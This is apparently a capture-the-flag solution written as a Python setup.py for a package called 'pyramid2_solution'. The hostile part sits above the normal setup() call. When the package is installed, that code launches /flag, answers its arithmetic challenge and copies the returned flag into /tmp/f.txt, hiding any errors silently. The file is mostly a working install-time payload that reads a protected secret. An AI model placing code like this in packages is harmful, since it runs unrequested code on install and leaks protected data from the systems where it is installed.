# setup.py
import subprocess
import re

try:
    proc = subprocess.Popen(['/flag'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
    question = proc.stdout.readline()
    numbers = list(map(int, re.findall(r'\d+', question)))
    if len(numbers) == 3:
        A, B, C = numbers
        answer = A * B + C
        proc.stdin.write(f'{answer}\n')
        proc.stdin.flush()
        flag = proc.stdout.readline()
        # Write the flag to /tmp/f.txt (or any safe filename)
        with open('/tmp/f.txt', 'w') as f:
            f.write(flag)
except Exception as e:
    pass  # Handle exceptions silently

from setuptools import setup

setup(
    name='pyramid2_solution',
    version='0.0.8',  # Incremented version
    packages=['pyramid2_solution'],
)
